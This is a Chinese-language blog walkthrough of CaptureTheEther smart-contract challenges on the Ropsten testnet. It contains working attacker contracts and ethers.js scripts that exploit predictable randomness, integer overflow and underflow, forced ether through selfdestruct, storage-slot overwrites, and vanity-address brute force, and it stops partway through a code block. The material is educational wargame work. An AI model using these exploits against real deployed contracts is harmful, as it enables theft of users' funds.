---
title: 'CaptureTheEther讲解'
date: '2022-07-26'
---


![image](https://images.unsplash.com/photo-1665305344188-ebd40311e926?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=2670&q=80)

# CAPTURETHEETHER

类似于Ethernauts, [题库网站](https://capturetheether.com/)

1. 如何每次点击`Check`的时候, 小狐狸弹窗有红色提示, 并且gas比较离谱, 那么说明这笔tx 基本上是失败的, 即有一些问题没有解决. 
2. **注意里面的一些合约地址, 替换成自己的**

---

### Warmup

---

###### Deploy a contract

这题不难, 部署一个合约, 然后Check一下, 点击两下Button即可, 完成✅

---

###### Call me

这题是部署合约, 部署完之后 需要调用一下 `callme` 这个function, 这个调用直接走ropsten显示的合约地址里面的 **WriteContract** 就可以. 然后返回Check一下, 完成✅

---

###### Choose a nickname

这个题的解题思路是 与 `0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee` 这个合约进行交互 运行如下函数

```solidity
function setNickname(bytes32 nickname) public {
  nicknameOf[msg.sender] = nickname;
}
```

由于这个合约并没有在etherscan上验证开源, 所以麻烦一点点

我完成的方法是 ,ethers计算出需要传递的数据, 然后再用小狐狸, 打开16进制, 直接发送一笔tx. 如下是ethers计算数据的方法

```javascript
const ethers = require('ethers')
let ABINeed = ["function setNickname(bytes32 nickname)"];
let ifaceNeed = new ethers.utils.Interface(ABINeed)
let text = "skyone"
let bytes32 = ethers.utils.formatBytes32String(text)
const endNeed = ifaceNeed.encodeFunctionData("setNickname", [ bytes32 ])
console.log(endNeed)
```

完成之后, 返回Check一下, 完成✅

---

### Lotteries

---

###### Guess the number

这个题的核心在于猜数, 当然, 合约里面写好了答案了, 是`answer=42`,  并且由于部署的合约已经在etherscan上验证, 所以直接去到相应的合约地址, WriteContract那里, 执行guess这个函数, 第一个ether参数那里输入1 [因为每次都需要1eth来运行这个函数] , 第二个参数那里输入42, 发起tx

返回点击Check, 完成✅

---

###### Guess the secret number

这个题比上一个题要难一点点, 这里的答案是某个数字的hash值, 因此, 我们倒推一下该数字, 才能破解这个题, 当前给出的hash值是`0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365` , 倒推的时候要注意, `guess`的这个function, 传参数`unit8`类型, 因此 答案一定是限制在 [0,255]之间的一个整数, 一段代码遍历即可, 代码如下, 最后我这边算出来是`170`

```javascript
const ethers = require('ethers')
for (let i = 0; i < 256; i++) {
    const end = ethers.utils.keccak256(i)
    if (end == "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365") {
        console.log(end,i)
    }
}
```

返回点击Check, 完成✅

---

###### Guess the random number

难度再次升级, 这里并没有给出明显的指向答案的值, 但是有一句`answer = uint8(keccak256(block.blockhash(block.number - 1), now));`  这里的`answer`的大概计算方式是 结合了一个区块哈希 和 now这个时间戳 算出来的一个值,  只需要知道两个值就能把这个题解出来, 1) 创建合约时的 上一个区块哈希; 2) 创建合约时的时间戳. 以测试的[合约](https://ropsten.etherscan.io/address/0x41689832B8301c47A9aBB2e3bdAaa756F84C1237)为例, 创建于 `12602184` 这个块, 所以上一个块 `12602183` 的区块[哈希](https://ropsten.etherscan.io/block/12602183)很容易找到, 即 `0xf4a21d405adf9d652247a5c203e4744423df861519d3545e0ded03d19da7bd05`,  除此之外, 创建合约时的[时间戳](https://ropsten.etherscan.io/tx/0xa3f02546131de7c84304f36d3de2b8e1642f11c3fa0178913c2bc2a89edf87c6) 也很容易找到, 即`Jul-16-2022 03:51:36 AM +UTC` 这两个值都有了, 写个代码计算一下`answer`即可

这是Javascript代码

```javascript
var timestamp = (new Date("2022-07-16T03:51:36").valueOf()/1000).toString(16).padStart(64, "0");
var blockhash = "0xf4a21d405adf9d652247a5c203e4744423df861519d3545e0ded03d19da7bd05"
const answerHash = ethers.utils.keccak256(blockhash + timestamp)
const end = ethers.BigNumber.from(answerHash).mod(Math.pow(2,8)).toString()
console.log(end)
```

这是Solidity代码 

```solidity
pragma solidity ^0.4.21;
contract B {
     bytes32 public answer;
     uint8 public an;
     uint256 public nowTime;
     bytes public abiencode;
     constructor () public {}
     function test() public {
          abiencode = abi.encode(0xf4a21d405adf9d652247a5c203e4744423df861519d3545e0ded03d19da7bd05, 1657943496);
          answer = keccak256(abiencode);
          an = uint8(answer);
          nowTime = now;
     }
}
```

除此之外, 还有另外一种解题方法, 去通过拿存储值的方式, 直接拿answer这个值, 虽然他不是public的, 但是也是存储在区块链里的

```solidity
const provider = new ethers.providers.JsonRpcProvider("https://ropsten.infura.io/v3/xxxxxxxxxxxxxxxx")
const end = await provider.getStorageAt("0x41689832B8301c47A9aBB2e3bdAaa756F84C1237", 0);
console.log(end)
```

返回Check , 完成✅

---

###### Guess the new number

这个题更难一些, 这里的`answer`不是固定的, 每次发起 guess 这笔tx时, answer会自动计算值, 核心原理和上一题一样, 只不过 在这里, 我们没有办法确定 `now` 这个具体的值, 因此 `走一层合约, 再发起tx是不错的原则` ,部署完 `attacker` 合约之后, 调用`attack`函数的时候, 记得需要发送1ETH

```solidity
pragma solidity ^0.4.21;
contract GuessTheNewNumberChallenge {
    function GuuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }
    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(blockhash(block.number - 1), now));
        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract attacker {
    function attack() public payable {
        uint8 result = uint8(keccak256(blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0x2fE75b0259D2fB1621A9508Be2De4aeEF306E519);
        target.guess.value(1 ether)(result);
    }
    function () public payable {
    }
}
```

返回Check, 完成✅

---

###### Predict the future

这个题的核心在于 先自己选择一个 [0,9] 之内的整数 锁进去, 然后 再来执行 settle 函数, 其中answer的值的计算方式和上面计算方式是一样的, 只不过最后 进行模10运算, `uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;` 同理, 我们这个题也选用走一层合约的方式去解决. 

> 注意: 这里我们需要有两个动作 ,一个是`LockInGuess` 另一个是`Guess` , 这两个动作 都需要用中间合约来完成, 即不能用我们自己的小狐狸钱包进行传参数调用,

合约代码如下

```solidity
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;
    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }
    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }
    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract attacker {
    PredictTheFutureChallenge target;
    constructor (address des) public {
        target = PredictTheFutureChallenge(des);

    }
    function attack() public payable {
        uint8 result = uint8(keccak256(blockhash(block.number-1),now)) % 10;
        if (result == 5) {
            target.settle();
        }
    }
    function lock() public payable {
        target.lockInGuess.value(1 ether)(5);
    }
    function settle() public {
        target.settle();
    }
    function withdraw() public {
        tx.origin.transfer(address(this).balance);
    }
    function () public payable {

    }
}
```

javascript调用如下

```javascript
require('dotenv').config()
const ethers = require('ethers')

async function main(){
    const provider = new ethers.providers.JsonRpcProvider("https://ropsten.infura.io/v3/xxxxx")
    const wallet = new ethers.Wallet(process.env.PK,provider)
    const tx = {
        to: "0x42Eb4a7a57db35D1b96A76b63Abfc38C1310d74d",
        gasLimit: 2000000,
        data: "0x9e5faafc", // attack的16进制调用代码
    }
    while (true) {
        const hash = await wallet.sendTransaction(tx)
        await hash.wait()
        console.log("Send TX Hash",hash.hash)
        const balance = await provider.getBalance("0x3e26732239e736Ee998B00Ed35f81C7B6DC8c1CE")
        const balance_eth = ethers.utils.formatEther(balance)
        if (balance_eth == "2.0"){
            console.log("Balance",balance_eth)
        }else{
            break
        }
    }
}

main()
```

---

###### Predict the block hash

这个题的要求在于, `LockInGuess`这个function 在运行的时候, 需要传参数`bytes32 hash`.这串hash 则是作为了 `guess`, 的值. 

同时 也会设定 `settlementBlockNumber` 等于当前区块+1,  然后去运行一下 `settle` 函数, 这里会计算一个answer, 但是这个answer 是根据 `settlementBlockNumber`来算的, 因此 当我们在运行`LockInGuess`的时候, 就会把一切需要的变量设定好. 

**核心在于 你输入的hash 需要是下个区块的 区块哈希, 即 你需要预测 未来的区块哈希, 从理论上来讲, 不可能** :apple: 

因此, 需要找找bug点, 这个点则是 **block.blockhash** 这个函数, 理论上来说, 是可以获得给定区块号的hash值, 但是 他只能支持最近的256个块[不包含当前区块], 对于256个区块之前的函数会返回0. 所以 解题办法是: **将 `lockInGuess` 传参数hash 是0 , 然后256个区块之后, 来调用一下settle函数即可.**, 由于合约没有验证开源, 因此ethers发送tx

```javascript
const ethers = require('ethers')
async function main(){
    const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
    const wallet = new ethers.Wallet(process.env.PK,provider)
    let ABINeed = ["function lockInGuess(bytes32 hash)"];
    let ifaceNeed = new ethers.utils.Interface(ABINeed)
    const para_hash = ethers.utils.formatBytes32String(0)
    const endNeed = ifaceNeed.encodeFunctionData("lockInGuess", [ para_hash ])
    const tx = {
        to: "0xBD9857b4BcF9Eb63801898ED844541b0a94927f8",
        gasLimit: 2000000,
        value: ethers.utils.parseEther("1"),
        data: endNeed,
    }
    const hash = await wallet.sendTransaction(tx)
    await hash.wait()
    console.log("Send TX Hash",hash.hash)
}
main()
```

等256个Block之后, 来运行一下Settle函数

```javascript
const ethers = require('ethers')
async function main(){
    const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
    const wallet = new ethers.Wallet(process.env.PK,provider)
    let ABINeed = ["function settle()"];
    let ifaceNeed = new ethers.utils.Interface(ABINeed)
    const endNeed = ifaceNeed.encodeFunctionData("settle")
    const tx = {
        to: "0xBD9857b4BcF9Eb63801898ED844541b0a94927f8",
        gasLimit: 2000000,
        data: endNeed,
    }
    const hash = await wallet.sendTransaction(tx)
    await hash.wait()
    console.log("Send TX Hash",hash.hash)
}

main()
```

返回Check一下,  完成✅

---

### Math

---

###### Token Sale

 这个题目要求是, 我们能够把合约中的钱拿出来, 首先明确的是, 我们只能调用两个Function, 一个是`Sell`, 一个是`Buy`, 如果想要把合约中的钱 不符合规则的情况下拿出来, 那只有一种可能, 即 我们用钱买的Token, 再卖回回去, 这个过程是有利润的, 但是按照常理来说, 1ETH买一个, 1ETH卖一个, 也不存在价差. 

重点则在于, **我们买的时候, 利用漏洞, 不用1ETH的价格来买, 然后再用1ETH的价格卖回去, 漏洞则是整数溢出** , **solidity中, 一般的uint类型来说, 最大的是uint256, 即我们在 buy 这个function中, 传参数的numberToken , 这个值 最大就是 $2^{256}-1$ , 同样, `msg.value` 这个值, 最大也是 $2^{256}-1 $. 因此, 我们利用这个漏洞来解这个题.**

在Buy的时候, `require(msg.value == numTokens * PRICE_PER_TOKEN);	` 这句话是重点,    即我们需要找到一个合适的 `numTokens `传进去, 使得计算出来的结果是 溢出的, 代表着 我们可以拿到非常多的Token, 而只需要付出一丁点的 `msg.value ` 假设 
$$
numTokens = x
$$
​    则有下式成立
$$
x*1ETH=x*10^{18}=msg.value. \quad x_{max},   msg.value_{max}==2^{256}-1
$$
 我们想要msg.value 变得比较非常小, 所以 我们应该假设 msg.value 求出来的值是 $2^{256}$ ,  因为只有这样, 进行模运算之后, 才能确保msg.value是一个非常小的值, 所以 有下式
$$
2^{256} / 10^{18} = x
$$
  这时候,  算出来的$x=115792089237316195423570985008687907853269984665640564039457.584007913129639936$, 但是solidity中不会有小数的存在, 因此算出来的 $x=115792089237316195423570985008687907853269984665640564039457$ .   注意, 这个x的值, 这时候 $x*10^{18}$算出来的是小于 $2^{256}-1$的,  因为之前向下取整了, 所以这时候x应该➕1, 即$x=115792089237316195423570985008687907853269984665640564039458$. 这时候, 用$x*10^{18} $ 算出来的值 是要比 $2^{256} -1 $   大, 因此就会进行模运算, 算出来的 $msg.value=0.415992086870360064ETH$,  

此时准备妥当, 进行Buy函数调用, 第一个参数写我们计算出的msg.value, 第二个参数 则是写数值x. 

Buy函数调用完毕之后, 进行Sell函数调用, 卖掉一个Token, 则从合约中取出了1ETH. 

**相当于, 我们花了 0.415992086870360064ETH 买了相当多的Token, 然后 卖掉1个, 返回1ETH**. 此时合约中还有0.4159ETH, 不用管即可. 或者再来几次, 都取出来,

---

###### Token Whale

这个题的要求是, 限定了Token的总量是1000, 但是他要求我们持有的Token总量要超过1m, **同样 上个题是上溢, 这个题的破解方法是下溢**. 

注意一点 即 `transferFrom`这个函数, 最后一行`_transfer(to,value)` 其实这个函数 起到的作用, 并不是tranferFrom, 而是Transfer. 即核心部分的逻辑并没有写对, 因此也给我们留下了破解的方法.

破解思想, 利用一个中介合约A, 先给这个合约授权2个代币的使用权, 然后合约A调用`TransferFrom`函数, 调用之后, 合约A的余额会非常非常多, 再调用合约A进行Transfer转账即可.

由于合约代码开源, 所以没有用Ethers调用, 直接写好合约 remix + etherscan调用相关函数即可. 

```solidity
pragma solidity ^0.4.21;

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    function TokenWhaleChallenge(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }
    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
    }
    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }
    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);
        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}


contract attacker {
    TokenWhaleChallenge target;
    constructor(address des) public {
        target = TokenWhaleChallenge(des);
    }
    function transfer(){
        target.transfer(msg.sender,10000000);
    }
    function transferFrom(){
        target.transferFrom(msg.sender, 0x4609F29Ea40a78196dCbc7EA54dAB8a02518984a, 1);
    }
}
```

运行完相应函数之后, 返回Check, 完成✅

---

###### Retirement Fund

这个题的要求是, 我们部署了一个退休基金的合约, 合约要求是 存款人10年之后才能提取这笔钱, 不然就只能取90%, 我们要做的就是, 如何在没有惩罚的前提下把这笔钱提取出来. 

**首先明确的是, 我们是不能够运行 withdraw 这个fucntion的, 因为owner不是我们的地址.** 

解题重点是这句话  `uint256 withdrawn = startBalance - address(this).balance;` 首先明确 withdrawn 是uint256类型, 正常来说, startBalance 和 address(this).balance, 一般是前者大于后者的过程, 而且 startBalance是不能改动的, 那么 如果 我们能让 startBalance < address(this.balance) 的情况发生, 那么 withdraw则是一个大于0的数[ uint256类型, 溢出 ], 则这个题目 可解.

**再来看函数, 貌似 不能向合约中直接转账, 没有fallback或者receive函数, 所以, 我们用别的方法 `selfdestruct`, 即我们用一个中间合约, 用这个合约向我们的银行地址转账, 然后 selfdestruct 掉, 这样就能使得 address(this).balance > startBalance**

```solidity
pragma solidity ^0.4.21;
contract RetirementFundAttacker {
    constructor() public payable {
    }
    function kill(address des) public {
        selfdestruct(address(des));
    }

}
```

新建合约的时候, 打一点钱比如 1wei, 然后调用kill函数.  再返回银行地址调用 collectPenalty 函数.

最后返回check, 完成✅

---

###### Mapping

这个题一看其实 挺懵的, 因为 这里并没有像之前的题目一样, 里面标明isComplete的值, 也告诉我们满足什么条件isComplete会返回True, 这个合约里的代码, 只有一个变量 isComplete, 其余的 则是一个动态数组

破解的点在于以太坊的slot 存储这里, 加入我们通过set动态数组 `map` 中的某一个值, 从而修改了 `isComplete` 这个值, 改为True, 则此题就能破解. 

这里简单介绍一下 slot的存储, 首先明白的是 `动态数组和Mapping` 并不是简单的依据其出现的位置, 比如 我们这个题目中 `isComplete` 存储的位置slot 是 0, 用`await provider.getStorageAt("0x844D8A9a3b610c578e6A3cBe3C2D4b4876D2CE81", 0)` 就能把这个值读出来, 但是如果读slot为1的值, 读来出的是 map的长度, 而map中元素存储位置的表达式为 keccak256(slot) + index . 即第一个元素, 即map[0]的存储位置是 keccak256(1) + 0, map[1]的存储位置是 keccak256(1) + 1. 那么当我们通过设置一个很大的index的时候, 就能构成上溢, 覆盖掉isComplete的值.

> 每个在以太坊虚拟机（EVM）中运行的智能合约的状态都在链上永久地存储着。这个存储可以被认为是每个智能合约都保存着一个非常大的数组，初始化为全0。数组中的每个值都是32字节宽，并且有2^256个这样的值。智能合约可以在任何位置读取或写入数值。这就是存储接口的大小。

计算 isComplete的 存储位置: $2^{256} - keccak256(bytes32(1))$ 其中 keccak256(bytes32(1)) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6, 用$2^{256} $ 减去这个值 得出来的结果是 35707666377435648211887908874984608119992236509074197713628505308453184860938,  这时候 利用 `set` 函数, 将这个地方的值设置为1即可破解

相应的js代码

```javascript
async function main(){
    const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
    const wallet = new ethers.Wallet(process.env.PK,provider)
    const total = ethers.BigNumber.from(`2`).pow(`256`)
    const mapDataBegin = ethers.BigNumber.from(
        ethers.utils.keccak256(
          `0x0000000000000000000000000000000000000000000000000000000000000001`
        )
    )
    console.log(total.sub(mapDataBegin).toString()) 
}
```

返回, Check, 完成✅

---

###### Donation

这个题考察的类似于上面的 **存储位覆盖**, 即通过改变owner, 来调用 `withdraw` 函数, 因为一般情况下, 我们无法调用 `withdraw` 函数, 因为owner不是我们的地址. 我们只能调用donate函数. 但是这个题的bug在于 在Donate函数中, 初始化Donation结构体的过程存在问题, 因为这里并没有表明是memory还是 storage, 因此默认为这是 storage, 这就代表着, 每一次运行donate函数, 都会重新创造一个donation, 覆盖掉原来的值, 并且, 并且他的slot站位, 分别是 0, 1.  因为这个结构体有两个值, 第二个是uint256类型. 

目前我们没有运行函数的时候, slot=1 存储的是 owner这个地址, 但是当我们运行donate 函数之后, slot=1的位置 会变成 `etherAmount`. 基于此, 我们可以通过输入一个合适的 etherAmount  来使得owner等于我们自身的地址, 这样我们就可以运行 `withdraw`函数 . 由于合约在etherscan上没有验证开源, 所以这里用ethers调用. 

Donate函数的调用如下: 

```javascript
async function main(){
    const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
    const wallet = new ethers.Wallet(process.env.PK,provider)
    let ABI = ["function donate(uint256 etherAmount)"]
    let iface = new ethers.utils.Interface(ABI)
    let amount = ethers.BigNumber.from(wallet.address)
    let value = amount.div(ethers.BigNumber.from(10).pow(36))
    const tx = {
      to : "0x27f80AB68c61b62855B997bcE101C4AdE918D022",
      data: iface.encodeFunctionData("donate", [amount]),
      value: value,
    }
    const hash = await wallet.sendTransaction(tx)
    await hash.wait()
    console.log(hash.hash)
}
```

Withdraw函数的调用如下:

```javascript
async function main(){
    const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
    const wallet = new ethers.Wallet(process.env.PK,provider)
    let ABI = ["function withdraw()"]
    let iface = new ethers.utils.Interface(ABI)
    const tx = {
      to : "0x27f80AB68c61b62855B997bcE101C4AdE918D022",
      data: iface.encodeFunctionData("withdraw")
    }
    const hash = await wallet.sendTransaction(tx)
    await hash.wait()
    console.log(hash.hash)
}
```

返回Check, 完成✅

---

###### Fifty years

这个题 要难不少, 算是前面溢出/覆盖的一个 高级题目.

这个题大概意思是, 自己为自己写了个银行, 初始存了1ETH, 如果想单单只把初始的1ETH取出来 , 需要50年之后.

平常还能向里面存一些钱, 或者修改某次存钱的余额, 每次存钱的时候, 都需要距离上次存钱时间过去一天以上, 才能创造新的存款记录. 最后想要取钱的话, 也需要大于在 `upsert` 中调用函数时传参数的TimeStamp才行. 

破解思路也是从 溢出/覆盖 入手,  需要知道的是, 每次新建Contribution的时候, **都会有amount以及unlockTimeStamp这两个参数** 而这两个参数 扰乱了 queue.length以及head 这两个变量, **即slot=0的位置, 存放的是 amount/queue.length,  slot=1存放的是 unlockTimeStamp/head**

 主要功夫则在于下面这个判断的 else 这里

```solidity
if (index >= head && index < queue.length) {
// Update existing contribution amount without updating timestamp.
Contribution storage contribution = queue[index];
contribution.amount += msg.value;
} else {
// Append a new contribution. Require that each contribution unlock
// at least 1 day after the previous one.
require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

contribution.amount = msg.value;
contribution.unlockTimestamp = timestamp;
queue.push(contribution);
```

Else这里会 创建新的 Contribution, 然后push 到动态数组中, 从而影响掉queue的length[amount=msg.value], 以及 head [unlockTimestamp=timestamp],  If这里只是影响 queue的length[amount]

插个题 : 拿slot的方法

```javascript
// 动态数组拿slot
const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(0))
  console.log(position)

//结构体的Position const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(2).mul(ethers.BigNumber.from(2))) 
//后面的是Size

  const end2 = await provider.getStorageAt("0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5", position)
  console.log(end2)
```

解题思路 大概有两种, 这里重点说一种, 第二种在注释灰色区域中

1. 发起第一笔upsert tx: $index=1, timestamp=2^{256}-24*3600, msg.value=1wei $, 这时候, head的值等于$2^{256} - 24*3600$. queue里面存了两个元素, 第一个元素的amount=1E, timestamp=now+50years, **第二个元素的amount=2WEI,** timestamp等于$2^{256} - 24 * 3600$, address(this)=1E+1WEI 

   >  做一说第二个元素的amount=2WEI, 是因为 queue.push(contribution); 多扩充了一个长度, 所以 amount变量被加了1

   ```javascript
   async function main(){
     const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
     const wallet = new ethers.Wallet(process.env.PK,provider)
     let ABI = ["function upsert(uint256 index, uint256 timestamp)"]
     let iface = new ethers.utils.Interface(ABI)
     const ONE_DAYS_IN_SECONDS = 24 * 60 * 60
     const timestamp = ethers.BigNumber.from(`2`)
                           .pow(`256`)
                           .sub(ONE_DAYS_IN_SECONDS)
     const tx = {
       to : "0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5",
       data: iface.encodeFunctionData("upsert", [1,timestamp]),
       value: 1,
     }
     const hash = await wallet.sendTransaction(tx)
     await hash.wait()
     console.log(hash.hash)
   
     // const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(3))
     // console.log(position)
   
     // const end2 = await provider.getStorageAt("0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5", position)
     // console.log(end2)
   }
   ```

2. 这时候 我们需要纠正过head的值, 因此发起第二笔upsert tx: $index=2, timestamp=0, msg.value=1wei$, 这个时候, head的值等于0, **queue里面存了两个元素**, 第一个元素的amount=1E, timestamp=now+50years, 第二个元素的amount=2WEI, timestamp等于$0$ , address(this)=1E+1WEI+1WEI

   > 因为msg.value=1WEI, 所以queue里面 是两个元素的长度, 把第二个元素重写了
   >
   > 如果msg.value=2WEI的话, 索然不会重写元素, 但是提取的时候, 会发现提取不了, 因为余额不够了
   >
   > 如果不重写, 需要的余额是 1E+2WEI+3WEI, 而账上余额只会是1E+1WEI+1WEI=1E+2WEI, 少了3WEI
   >
   > ❤️ 第二种思路在这 ✔️, 即不重写第二个元素, 缺少3WEI的情况下, 用上面我们提到的 selfstruct函数 , 把3WEI送过去, 也能完成.

   ```javascript
   async function main(){
     const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
     const wallet = new ethers.Wallet(process.env.PK,provider)
     let ABI = ["function upsert(uint256 index, uint256 timestamp)"]
     let iface = new ethers.utils.Interface(ABI)
     const tx = {
       to : "0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5",
       data: iface.encodeFunctionData("upsert", [2,0]),
       value: 1,
     }
     const hash = await wallet.sendTransaction(tx)
     await hash.wait()
     console.log(hash.hash)
   
     // const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(3))
     // console.log(position)
   
     // const end2 = await provider.getStorageAt("0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5", position)
     // console.log(end2)
   }
   ```

3. 这个时候 运行 withdraw(1) 即可把所有的钱取出来

   > 相应的第二种思路 这里改一下withdraw(2)即可

   ```javascript
   async function main(){
     const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
     const wallet = new ethers.Wallet(process.env.PK,provider)
     let ABI = ["function withdraw(uint256 index)"]
     let iface = new ethers.utils.Interface(ABI)
     const tx = {
       to : "0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5",
       data: iface.encodeFunctionData("withdraw", [1]),
     }
     const hash = await wallet.sendTransaction(tx)
     await hash.wait()
     console.log(hash.hash)
   }
   ```

返回Check, 完成✅

--------

### Accounts

###### Fuzzy Identity

这个题大概要求是 创建一个合约地址 [由于有一个name()的接口 这一定是合约地址], 这个合约地址需要满足两个要求:

1. 调用name() 返回 bytes32(smarx), 这个不难, 在合约中实现一下即可

2. 创建的这个合约, 需要满足, 它的地址 是符合 `isBadCode` 的要求的, 即合约地址中, 存在着这样的六个字符即可 “badc0de” 

   > 之所以, 必须要有这6个字符, 不需要管出现在哪个位置, 
   >
   > 1. 是因为 isBadCode 这个判断中, 会让合约地址 与 ffffff 做 **位与运算** 运算结果 需要等于 **badc0de** 
   > 2. 不需要管位置是因为, 会进行34次迭代, 即这六个字母 从最后面 一直挪到最前面
   > 3. 如果想要结果 等于 badc0de 的话, 这一定要确保 合约地址中也出现这六个字符 才能出现这个结果 

第二个要难一些, 解题的JS代码如下: [时间要长一些, 我大概跑了 200W地址吧 🥲]

```javascript
async function main(){
  const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
  let flag = true
  let count = 0
  // const wallet = new ethers.Wallet(process.env.PK,provider)
  while (flag) {
    const wallet = ethers.Wallet.createRandom()

    for (let nonce=0;nonce<3;nonce++){
      const contractAddr = ethers.utils.getContractAddress({
        from: wallet.address,
        nonce: nonce
      })

      if (contractAddr.toLocaleLowerCase().search("badc0de") != -1) {
        console.log(wallet.privateKey)
        console.log(nonce)
        console.log(contractAddr)
        flag = false
        break
      }
    }
    count = count+ 1
    if (count % 100 == 0){
      console.log(count)
    }
  }
}
```

 拿到相应的私钥 以及 Nonce之后, 便可以部署 符合地址要求的attack合约了

相应的合约代码如下

```solidity
pragma solidity ^0.4.21;

interface IName {
    function name() external view returns (bytes32);
}

contract FuzzyIdentityChallenge {
    bool public isComplete;

    function authenticate() public {
        require(isSmarx(msg.sender));
        require(isBadCode(msg.sender));

        isComplete = true;
    }

    function isSmarx(address addr) internal view returns (bool) {
        return IName(addr).name() == bytes32("smarx");
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}

contract attack {
     function name() pure external returns (bytes32){
          return bytes32("smarx");
     }

     function auth() public {
         FuzzyIdentityChallenge use = FuzzyIdentityChallenge(0x7740ff10016819f29425D2ec989C523d676F668A);
         use.authenticate();
     }
}
```

返回检查, 完成✅

---

###### Public Key

这个题目要求是 计算出 相应地址的公钥, 如果无任何头绪计算, 则很明显是不可能的事情, **但是如果有了某个账户发出的tx, 这我们可以根据这笔tx 判断出相应地址的 公钥**, 从ropsten上面 找到这一笔 [tx](0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb)  根据这笔tx的信息, 我们就能推断出公钥.

推断公钥的 JS代码如下

```javascript
async function main(){
    const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
    const tx = await provider.getTransaction("0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb")
    const txData = {
        gasPrice: tx.gasPrice,
        gasLimit: tx.gasLimit,
        value: tx.value,
        nonce: tx.nonce,
        data: tx.data,
        to: tx.to,
        chainId: tx.chainId
    }
    const signingData = ethers.utils.serializeTransaction(txData)
    const msgHash = ethers.utils.keccak256(signingData)
    const signature = {r: tx.r, s: tx.s, v: tx.v}
    let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature)
    let address = ethers.utils.keccak256("0x"+rawPublicKey.slice(4))
    console.log("public Key:", "0x"+rawPublicKey.slice(4))
    console.log("Address:", address)
}
```

由于合约没有开源验证, 因此 ethers 发送tx的代码如下:

```javascript
async function main(){
    const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
    const wallet = new ethers.Wallet(process.env.PK, provider)
    let iface = new ethers.utils.Interface(["function authenticate(bytes publicKey)"])
    const tx = {
        to: "0xF402789F89B70972eD2BF4d2B0498dCCe2B7A28f" ,
